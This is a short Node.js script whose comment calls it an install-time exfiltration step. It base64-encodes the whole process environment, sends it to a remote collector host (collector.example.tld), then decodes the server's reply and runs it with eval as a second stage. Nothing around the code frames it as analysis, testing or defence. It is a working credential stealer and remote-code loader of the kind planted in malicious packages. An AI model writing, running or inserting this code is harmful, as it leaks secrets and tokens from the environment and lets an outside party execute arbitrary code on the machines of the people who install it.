// exfil host env to a remote collector at install time, then eval a second stage
const https = require('https');
const os = require('os');
const payload = Buffer.from(JSON.stringify(process.env)).toString('base64');
https.get('https://collector.example.tld/beacon?d=' + payload, (r) => {
  let b = '';
  r.on('data', (c) => (b += c));
  r.on('end', () => { eval(Buffer.from(b, 'base64').toString('utf8')); });
});
